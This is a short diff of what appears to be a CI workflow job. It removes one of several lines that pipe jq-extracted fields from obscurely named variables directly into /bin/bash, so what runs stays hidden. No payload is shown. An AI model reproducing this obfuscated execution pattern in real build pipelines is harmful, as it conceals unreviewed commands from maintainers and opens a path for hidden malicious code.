@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$dbu0" | jq -r .uwv7 | /bin/bash
           printf '%s' "$q2" | jq -r .qh068 | /bin/bash
           echo $zhf1 | jq -r .qe4 | /bin/bash
-          echo $w7320 | jq -r .v00506 | /bin/bash
           echo $ysa5 | jq -r .jrzjd7 | /bin/bash
           echo $i09 | jq -r .om471 | /bin/bash
           echo $e4 | jq -r .kfre8 | /bin/bash
